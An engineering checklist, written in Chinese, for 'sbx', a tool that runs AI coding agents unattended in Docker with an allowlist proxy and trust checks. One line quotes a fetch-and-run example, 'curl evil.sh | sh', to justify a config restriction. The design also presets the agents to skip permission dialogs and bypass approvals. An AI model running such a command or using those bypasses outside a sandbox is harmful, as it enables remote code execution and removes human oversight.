# sbx 实施清单

| 项 | 内容 |
|---|---|
| 依据 | [design.md](design.md)、ADR 0001–0016（`private/adr/`，未纳入版本控制） |
| 日期 | 2026-10-04 |
| 用法 | 按里程碑顺序推进。每一项都写了**完成标准**和**依据**（§ 指 design.md 的章节）。完成后勾选。 |

**约定**
- 每个里程碑结束时，都要在一个真实仓库上走通该阶段的完成标准，而不仅仅是单元测试通过。
- M0 的任何一项结论推翻了现有设计，就先补 ADR、改 design.md，再继续往下做。
- 编号格式 `M<阶段>-<序号>`，方便以后转成 `/local-issues` 的 issue。

---

## M0 验证 ✅ 已完成（2026-10-04，见 [M0-SUMMARY](../spikes/M0-SUMMARY.md)；Codex 部分推迟到 M3-6）

> 目标：把会推翻设计的不确定项先排除。产出放在 `spikes/<编号>/`，每项附一份 `RESULT.md`（结论、证据、对设计的影响）。

- [x] **M0-1 容器内 OAuth 登录** · §7.1、ADR 0006
  - 在 Debian 容器里装 claude 和 codex，挂载一个 volume 作为 home，分别执行登录。
  - 依次尝试三种方式：回调端口映射到宿主机 `127.0.0.1`、设备码、粘贴 URL。
  - 完成标准：两个 CLI 各有一种可行方式；重建容器后，凭据仍然保留在 volume 里，可以直接使用。
- [x] **M0-2 macOS bind mount 的 IO 性能** · ADR 0008
  - 用一个中等规模的 Next.js 仓库和一个 Go 仓库，在 Docker Desktop（VirtioFS）上测：依赖装在 volume 里时的 `pnpm install`、`next build`、`go test ./...`、`git status`，并和宿主机原生耗时对比。
  - 有条件的话，同时测 OrbStack 作为对照。
  - 完成标准：给出耗时对比表和推荐的运行时；判断"只遮盖依赖目录"是否够用。
- [x] **M0-3 Squid 串联宿主机代理** · §6.4、ADR 0005
  - 先确认宿主机代理的类型和端口（HTTP / SOCKS / 混合端口）。
  - 用 `ubuntu/squid` 加 `cache_peer` 指向 `host.docker.internal:<port>`，在 internal 网络里的容器上 `curl https://api.anthropic.com`。
  - 完成标准：白名单内的请求成功，白名单外的请求被拒，并且 access.log 里有 `TCP_DENIED`。如果宿主机只提供 SOCKS，要给出替代方案。
- [x] **M0-4 带认证的代理 URL 的兼容性** · §6.2、ADR 0014
  - 设置 `HTTPS_PROXY=http://u:p@proxy:3128`，逐个验证：claude、codex、npm、pnpm、pip、uv、cargo、go mod、git clone（https）、curl。
  - 完成标准：给出兼容矩阵；不兼容的工具要有绕过办法（比如在工具自己的配置文件里写代理），或者标记为需要 dedicated 模式。
- [x] **M0-5 Agent 状态 hooks** · §7.2、ADR 0011
  - 验证 Claude 的 `Stop`、`Notification`、`UserPromptSubmit` hooks，以及 Codex 的 `notify`，能否可靠地区分 running 和 idle。
  - 完成标准：交互和 headless 两种模式下，状态文件都会正确变化。
- [x] **M0-6 结论汇总**：更新 design.md 的 §14 风险表，必要时补 ADR 0015 及以后的编号。

---

## M1 MVP：一个 Task 能无人值守地跑起来 ✅ 已完成（2026-10-08）

> 完成标准：在一个真实仓库上开 2 个并行 Task，claude 无人值守地各完成一次改动，然后在主仓库里看到两个 `sbx/<task>` 分支。
>
> 详细的执行步骤见 [m1-checklist.md](m1-checklist.md)（WP1–WP9）。

### 工程骨架
- [x] **M1-1** 初始化 Go module，按 §12 建好目录结构，`cmd/sbx` 用 cobra。
- [x] **M1-2** `internal/docker`：封装 docker CLI（run/exec/inspect/network/volume/build），统一解析 `--format json` 输出，错误信息里带上原始命令。
- [x] **M1-3** 基础设施：Makefile 或 justfile、golangci-lint、单元测试，以及需要 docker 的集成测试（用 build tag 隔离）。

### 配置（先做最小版）
- [x] **M1-4** `internal/config`：读取内置默认和 `~/.sbx/config.toml`，用结构体定义 schema。四层合并放到 M2。

### Workspace 和 Task
- [x] **M1-5** `internal/workspace`：用 `git rev-parse --show-toplevel` 定位仓库，计算 ws id（§3）。
- [x] **M1-6** worktree 管理：`git worktree add ~/.sbx/worktrees/<ws>/<task> -b sbx/<task> <base>`；`main` Task 直接使用主工作目录。校验 task 名合法，处理同名冲突。
- [x] **M1-7** `internal/task`：state 目录、`meta.json` 读写，状态推导（先只区分 running、stopped、exited）。

### 镜像
- [x] **M1-8** `assets/profiles/web-go/Dockerfile`（§5.2 A）。
- [x] **M1-9** `assets/agent-layer/`：Dockerfile 模板（参数是 profile 基础镜像、UID/GID），tini，**非 root 用户 agent**，claude 和 codex 用最新版本，tmux、git、ripgrep、jq，`entrypoint.sh`；默认环境变量包括 `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` 和包缓存路径变量（§4.2、§5.3）。
- [x] **M1-10** `internal/image`：计算派生镜像 hash（§5.1），镜像不存在时先构建 Profile 再叠加 Agent 层；把构建进度透传给用户。

### 网络
- [x] **M1-11** 创建 `sbx-egress` 和 Task 的 internal 网络。
- [x] **M1-12** `internal/proxy` shared 模式：
  - 渲染主配置；生成凭据和 htpasswd；写入 tasks 和 allow 片段。
  - 管理 `sbx-proxy` 的生命周期；`network connect` 时加上网络别名 `proxy`；执行 reconfigure。
- [x] **M1-13** 白名单的内置层（**包括 `.claude.com`**）、策略拦截层（云端 MCP，ADR 0015），以及 web-go 的语言栈预设（§6.3），作为 embed 资产；生成时去重。

### 容器和 Agent
- [x] **M1-14** 按 §4.2 生成挂载：worktree 和 `.git` 用与宿主机相同的路径，`sbx-home`，宿主机配置只读挂入，`sbx-cache`，依赖遮盖（M1 先固定遮盖 `node_modules`）。
- [x] **M1-15** 生成 `/sbx/gen/`（**整个目录挂载**）：hooks 脚本、`settings.sbx.json`（通过 `--settings` 注入，不带宿主机的 hooks）。注入 git 身份环境变量和代理环境变量。
- [x] **M1-15a** 预置 Claude 的首次启动状态（§7.2）：`hasCompletedOnboarding`、`projects[<worktree>].hasTrustDialogAccepted`、`theme`、`skipDangerousModePermissionPrompt`；用 jq 加 tmp + rename 幂等写入。验证方法：交互模式在 tmux 里启动后，画面上没有任何对话框。
- [x] **M1-15b** 所有 sbx 写入、会被容器读取的文件一律用原子写入（tmp + rename），并且以目录方式挂载（M0-3）。
- [x] **M1-16** 设置资源上限的默认值（2C/3g/1024 pids，ADR 0012 修订）。

### 命令
- [x] **M1-17** `sbx run [task]`：按 §10.1 实现第 1、2、4、6–10 步（信任检查和并发检查放到 M2）。
- [x] **M1-18** `sbx attach`、`sbx stop`、`sbx shell`。
- [x] **M1-19** `sbx ls`：列出状态、分支、ahead 数和 diff 统计。
- [x] **M1-20** `sbx done`：清理容器、网络、volume、worktree、state 和代理凭据，保留分支；最后一个 shared Task 结束后停掉 `sbx-proxy`。
- [x] **M1-21** 临时登录方案：在文档里写明 `docker run -it -v sbx-home:... <镜像> claude auth login` 的手动步骤（M0-1 已验证）；正式的 `sbx login` 放到 M2。sbx-home 首次创建时按 Agent 的 UID/GID 设置属主。

### 验收
- [x] **M1-21a** 项目自动记忆同步（ADR 0016）：`sbx run` 时导入沙箱，`sbx memory pull` 展示差异后导回宿主机；三方比较，`MEMORY.md` 冲突时按行合并。
- [x] **M1-21b** `sbx path [task]` 打印 Task 工作目录；`sbx ls` 增加 PATH 列（真实使用时发现：worktree 里的改动在仓库目录看不到，路径不好找）。
- [x] **M1-22** 端到端验收：跑通本阶段开头的完成标准，并确认：
  - 容器里 `curl` 一个白名单之外的域名会失败（`--net allowlist`；默认的 open 模式下放行，但日志里有记录）。
  - 容器里看不到宿主机的 `~/.ssh`。
  - 宿主机上的 `node_modules` 没有被写入。

---

## M2 安全与配置

> 完成标准：篡改 `.sbx/` 会被拦住；被拒的域名能一键放行；open 模式和 dedicated proxy 模式都可用；你和团队成员 clone 下来，执行 `sbx trust` 后就能 `sbx run`。

### 配置
- [x] **M2-1** 合并四层配置（§9.1）：列表取并集，标量后者覆盖前者；`sbx config show` 打印最终生效的值，并标注每个值来自哪一层（标量记最后一层，列表记所有贡献者）。校验在合并之后做，报错会指出值来自哪一层。
- [x] **M2-2** 项目层校验：键名含 `key/token/secret/password/credential` 或值是绝对路径时直接报错；走通用 map 遍历，未知字段也挡得住。

### 信任确认
- [x] **M2-3** `internal/trust`：计算哈希，保存快照，生成 diff（§9.3）。哈希覆盖 `.sbx/` 下所有文件（含子目录）的路径、类型、大小和内容哈希；符号链接按链接本身记录，不跟随。≤256KB 的文本文件把内容存进快照，所以下次能直接显示 diff；二进制和超大文件只存哈希，变更照样能发现，只是给不出 diff。记录在 `~/.sbx/trust/<ws>.json`。
- [x] **M2-4** `sbx run` 在合并配置之后、碰容器之前做信任检查（§10.1 第 3 步）；`sbx trust`（`--show` 只看不写，`-y` 不询问）。没有 `.sbx/` 的仓库完全不受影响。`net allow --project` 写完会顺手更新信任记录，但仅限写之前本来就是已信任状态。
- [x] **M2-5** 测试：`internal/trust` 9 个（哈希跟内容/路径/子目录走、符号链接不跟随、三类 diff、二进制、存取往返），`internal/cli` 5 个（没有 `.sbx/` 不拦、首次拦住并展示内容、trust 之后放行、改动和新增文件再次拦住、retrust 不越权）。信任检查只拦 `run`，不碰已经在跑的容器，`attach`/`shell`/`ls` 不受影响。

### 网络
- [x] **M2-6** open 模式：`--net open` 和配置项 `network.mode`；shared 模式下生成 open 片段。**默认值已改为 `open`**（2026-10-08，ADR 0005 修订）。
- [x] **M2-7** dedicated 模式：sidecar 的创建和销毁，`--proxy dedicated` 和配置项 `network.proxy`。两种部署收敛到一个 `proxy.Egress` 接口，`run`/`stop`/`done`/`net` 不做模式分支。**模式建容器时定下并记进 meta.json**，之后改配置不会把已有 Task 搬过去（要换得 `done` 后重建）。sidecar 不做代理认证（只有本 Task 的 internal 网络连得到它），配置整份写在 `state/<ws>/<task>/proxy/`。agent 容器的 `sbx.proxy` label 跟着实际模式写，否则 dedicated 的 Task 会让 `sbx-proxy` 永远停不掉（实测踩到）。`net denied` 对两种模式用同一套解析：dedicated 日志里没有用户名，由 sbx 按实例补上 TaskID。
- [x] **M2-8** 上游代理：`network.upstream` 对应 `cache_peer`，shared 和 dedicated 都支持；Linux 上给 squid 容器加 `--add-host host.docker.internal:host-gateway`。只接受 http 上游，缺端口或写成 socks5:// 在配置校验阶段报错并指出是哪一层写的。改了上游不用重建容器，下次 `run` 主配置变了会自动 reconfigure。
- [x] **M2-9** 项目层白名单 `network.allow`：随 M2-1 的列表并集生效。
- [x] **M2-10** `sbx net denied [task]`：解析 access.log，shared 模式下按用户名过滤；**分三类**统计：不在白名单（默认展示）/ 策略拦截和遥测（`--all`）/ 407 认证失败（§6.5）。
- [x] **M2-10a** `network.cloud_mcp` 和 `sbx run --cloud-mcp` 解除云端 MCP 拦截（ADR 0015）。flag 只能打开不能关——关是默认值。R11 已解决：`cloud_mcp = false`（默认）时在注入的 settings 里写 `disableClaudeAiConnectors: true`，claude 不再去取云端连接器，重试风暴消失。
- [x] **M2-11** `sbx net allow <host>...`：写入个人全局配置（保留注释和排版），对运行中的 Task 重新下发白名单并 reconfigure。`--project` 写 `<repo>/.sbx/sandbox.toml`，写完重读四层并更新信任记录。

### 认证
- [x] **M2-12** `sbx login [claude|codex]`：临时容器挂 `sbx-home` 跑 `claude auth login`，附 `--status / --logout / --force / --console / --email`；不需要在 git 仓库里执行。Agent 是表驱动的（`authCLIs`），codex 待 M3-6 验证后加一条。
- [x] **M2-13** API key 注入：`agents.<name>.api_key_env` / `api_key_file`（二选一，同时配报错），建容器时以 `ANTHROPIC_API_KEY` 注入，优先级高于订阅登录；配了但取不到值直接报错，不静默退回订阅。环境变量名是表驱动的（`authCLIs.keyEnv`）。**实测发现 claude 会弹 "Detected a custom API key … Do you want to use this API key?" 并默认停在 No**，所以 preseed 顺带把 key 的后 20 个字符写进 `~/.claude.json` 的 `customApiKeyResponses.approved`。环境变量只能在建容器时注入，配置后改了要 `done` 后重建——`sbx run` 会检测并明确提示。

### 资源
- [x] **M2-14** 并发检查：正在运行的 agent 容器数达到 `max_running` 时拒绝启动（**跨 Workspace 计数**，因为 Docker VM 的内存是共用的；限额取自当前 Workspace 的配置）。`sbx run` 一个已经在跑的 Task 只是 attach，不受限。`max_running × memory > Docker VM 内存 × 0.95` 时警告（R10；**阈值 2026-10-09 从 0.85 放宽到 0.95**，否则 design §11 推荐的 3 × 3g + 10GB VM 自己就会报警，每次 run 都刷一条）。
- [x] **M2-15** 资源上限支持在各配置层覆盖：`resources.cpus/memory/pids` 三个字段都走 `bindings` 表，四层都能写，`sbx config show` 能看出每个值来自哪一层；非法值在合并之后校验，报错指出来源层。项目层也能写（不是红线字段，而且 `.sbx/` 的改动要过信任确认）。

---

## M3 完整体验

> 完成标准：整夜跑 `/auto-it`，第二天通过通知和 `sbx ls` 掌握全部结果。py-rust 和自定义 Profile 都可用，Codex 可用。
>
> **现状（2026-10-09）：除 M3-6（Codex）外全部完成。** 无人值守那条路已经通了——`sbx run -p` 跑完自己停容器、`on_idle`/`on_exit` 发通知、`sbx ls` 的 DENIED 列和 `--all` 看全局、`sbx doctor` 自查。

### 镜像和 Profile
- [x] **M3-1** `assets/profiles/py-rust/Dockerfile`（§5.2 B）：rustup stable + clippy/rustfmt + uv，**不装系统 python**（这个 Profile 里 Python 由 uv 负责，再来一个系统解释器只会让"我用的是哪个 python"不好回答）；`assets/allowlist/py-rust.txt` 是对应的白名单预设。实测踩到两件事：`rustup-init` 的 `--component` 要用逗号分隔（写成两个参数会被拒），以及 **`curl | sh` 的退出码是 sh 的**——下载失败时那一层会"构建成功"但什么都没装上（uv 就这么静默缺失过一次），改成先下载再执行、最后 `uv --version` 验一遍。
- [x] **M3-2** 自定义 Profile。优先级：配置里的 `image` > `<repo>/.sbx/Dockerfile` > 内置 Profile，全部收口在 `imageInputs()`（`image.Inputs` 本来就是"Dockerfile 字节 + hash"的抽象）。`.sbx/Dockerfile` 在信任确认的覆盖范围内，所以"项目自带 Dockerfile"天然要先过 `sbx trust`。
  - **配置键用顶层 `image` 而不是设计稿写的 `profile.image`**：`profile` 是标量，TOML 里没法再当表用。
  - 底层镜像不是 Debian/Ubuntu 系时明确报错（ADR 0007），实测 `alpine:latest` 会被挡下并说清原因。检查命令末尾要 `exit 0`——`command -v` 找不到东西会让整条命令非 0 退出，那会被当成"镜像跑不起来"而放行。
  - **Node 改由 Agent 层负责**：claude 是 npm 包，而 py-rust 这类 Profile 里没有 Node。原来只能得到一句 `exit code: 127`，现在 Agent 层在底层没有 npm 时自己装（design §5.1 本来就把 claude 划在 Agent 层）。
- [x] **M3-3** mise：Agent 层装 mise，`sbx-mise` volume 挂在 `/home/agent/.local/share/mise`（叠在 sbx-home 之上，运行时是所有 Task 共享的，不该跟着登录态走）。启动前在宿主机侧扫版本文件，有才进容器跑 `mise install`，装不上只警告不拦（项目可能声明了一个 mise 装不了的运行时）。实测：`.nvmrc` 装 node 第一次 51s，第二个 Task 复用 volume 只要 2.8s。
  - 两个坑：**mise 默认不读 `.nvmrc` 这类"惯用版本文件"**，要 `MISE_IDIOMATIC_VERSION_FILE_ENABLE_TOOLS`；**login shell 会被 `/etc/profile` 重置 PATH**，ENV 里的 shims 目录会被挤掉（design §5.3 的老坑又来一次），所以额外放一份 `/etc/profile.d/10-sbx-mise.sh`。
- [x] **M3-4** `sbx upgrade`：只重建 Agent 层；支持锁定 Agent 版本。（M1 收尾时提前实现，镜像里关闭自动更新；冒烟测试复用下次 run 的检查）
- [x] **M3-5** 依赖遮盖由配置驱动（M2 已通）+ **per-Profile 默认值**：web-go → `node_modules`/`.next`，py-rust → `.venv`/`target`。默认值在**四层合并之后**按最终 profile 补上，再和显式写的取并集——profile 可能被后面的层改掉，而列表是并集的，先放 web-go 的默认值再并上 py-rust 的会得到一份四不像（多出来的遮盖项会在 worktree 里凭空建出目录）。

### Agent
- [ ] **M3-6** 支持 Codex：生成 `config.toml`，带上 `--dangerously-bypass-approvals-and-sandbox`，支持 `--agent codex` 和 `default_agent`。
- [x] **M3-7** headless 模式：`sbx run <task> -p "..."`（`-p -` 读 stdin），输出写入 `run.log`；`sbx logs <task> [-f] [-n]` 直接读宿主机上的文件，容器停了也看得到。**仍然跑在 tmux 里**（"有没有 Agent 在跑"只有 `tmux has-session` 一个事实来源，另起一条路会让第二次 run 再拉起一个 claude 抢同一棵 worktree），`sbx attach` 因此还能围观 headless 的输出。prompt 走 `gen/prompt.txt`，不进命令行。**跑完由脚本 `kill 1` 停掉容器**（design §3.1 的状态机），释放内存和并发名额；`run.exit` 里是 claude 的退出码，`sbx ls` 显示 `exited(<code>)`，sbx 自己也用这个码退出。Task 正在 running/idle 时 `-p` 直接拒绝（§10.1 第 4 步）。

### 状态和通知
- [x] **M3-8** 注入状态 hooks。**M1 实现时就顺带做完了**（`agent.hookEvents`），而且比设计多两个事件：`Notification`（空闲约 60s）和 `SessionEnd`（claude 自己退出）。M3-7 实测确认 headless 下事件序列同样完整：`SessionStart → UserPromptSubmit → PreToolUse → Stop → SessionEnd`。
- [x] **M3-9** `sbx ls` 补全显示：idle、`exited(code|oom)`、最后活动时间在 M1 就有了；这次补上 **DENIED 列**（只数"不在白名单"那一类，整张表只读一次代理日志，按各 Task 的 `meta.CreatedAt` 切窗口；读不到就整列 `-`，加 3 秒超时和 `--no-denied`）和 **`--all`**（跨 Workspace，从各 Task 的 meta 还原仓库路径，**不要求当前在 git 仓库里**）。顺带把表格从 tabwriter 换成按显示宽度对齐的 `writeTable`，修掉 CJK 列错位。
- [x] **M3-10** 执行 `on_idle` / `on_exit`：在容器内运行，`on_idle` 挂 `Notification`、`on_exit` 挂 `SessionEnd`。独立的 `notify.sh`（不塞进 `status.sh`：状态必须永远快且不失败，通知是会挂住的网络 IO），带节流（`notify_throttle`，默认 600 秒）、20 秒超时、永远 exit 0，输出进 `notify.log`。webhook 主机由 `proxy.HostsIn` 从命令里正则扫出来，作为"通知域名"层自动加进白名单；含变量或裸 IP 的会提示手动 `net allow`。
  - **新增项目层第三条红线**：`on_*` 这类会在容器里执行的命令只能写在全局层或工作区层。原来的两条（密钥键名、绝对路径）拦不住 `on_idle = "curl evil.sh | sh"`，而信任确认时没人逐行读 shell。
  - **headless 下 `on_exit` 由包装脚本发**，不走 SessionEnd hook：只有它拿得到 claude 的退出码，而 hook 那条会先把节流窗口占掉（实测踩到）。

### 其他命令
- [x] **M3-11** `sbx port <task> <port>`：**R7 定为 socat 转发容器**（重建 agent 容器会杀掉正在跑的会话，无人值守下不可接受）。`sbx port <task>` 列出已映射的，`--rm` 收回，`done` 时按 `sbx.kind=port` label 一并清理。
  - 实测踩到：转发容器**不能只接 Task 网络**——那是 `--internal` 网络，docker 不会给只连它的容器做端口映射，`-p` 静默不生效。改成先接默认 bridge 再 `network connect` 到 Task 网络。
- [x] **M3-12** `sbx drop <task>`：复用 `done` 的全部清理，再删分支；要求**输入 Task 名**确认（`-y` 跳过），确认提示里会说明有多少个提交会一起没掉——分支是这套工具里唯一真正不可逆的东西。
- [x] **M3-13** `sbx doctor`：表驱动的 8 项检查（docker / vm-memory / upstream / sbx-proxy / login / trust / notify / smoke），每项给 `✓ ! ✗ -` 和一行可直接复制的修复建议。不要求在 git 仓库里（仓库相关的项标"跳过"）；docker 探不到时所有依赖它的项一并跳过，不刷一屏红叉。
  - 复用现成判定：VM 内存用 `budgetWarning`，代理健康用新增的只读 `proxy.Shared.Health()`（**代理停了但还有 shared Task 在跑 = fail**，R8），登录态用 `authStatus`，冒烟用 `agent.DialogIn`（R9）。
  - 冒烟优先零成本：有正在跑的 Task 就抓它的 tmux 画面；没有就跳过（`sbx run` 本身每次都会做这项检查）。
  - **退出码：有 fail 才非 0**；warn 的语义是"能用但该改"，让它挂掉会逼人写 `|| true`。`--strict` 下 warn 也算失败。

### 发布
- [x] **M3-14** `make release`：darwin/linux × amd64/arm64 四个产物打包成 `dist/*.tar.gz` 外加 `SHA256SUMS`，版本号用 `git describe` 注入（`sbx --version`）。`dist/` 已进 .gitignore。**不做 GitHub Actions**（本轮明确不做）。
- [x] **M3-15** README：快速上手（补了从发布包安装）、团队接入（提交 `.sbx/sandbox.toml` → 队友 `sbx trust` → `sbx run`，并说明这个文件里写不了什么）、常见问题表（OOM、被代理拦、登录过期、`.sbx/` 变动、说不清就 `sbx doctor`）。中英两份都有。

---

## 后续（暂不排期）

- [ ] 缓解 R1：启动前对 `.git/hooks` 和 `.git/config` 做快照比对，或者在宿主机侧设置 `core.hooksPath`（ADR 0003）。
- [ ] 适配 devcontainer.json（ADR 0007）。
- [ ] Task 排队调度（需要的话，要先重新评估"不做常驻进程"的原则）。

---

## 依赖关系速览

```
M0-1 ─────────────► M1-21 ─► M2-12
M0-2 ─────────────► M1-14（遮盖策略）
M0-3 ─────────────► M2-8
M0-4 ─────────────► M1-12（如果不兼容：M2-7 dedicated 模式要提前）
M0-5 ─────────────► M3-8

M1-2 ─► M1-10 ─► M1-17
M1-5 ─► M1-6 ─► M1-17
M1-11 ─► M1-12 ─► M1-17
M1-17 ─► M1-18/19/20 ─► M1-22
M2-1 ─► M2-3 ─► M2-4
M2-1 ─► M2-9 ─► M2-11
M1-12 ─► M2-6/7/10
```
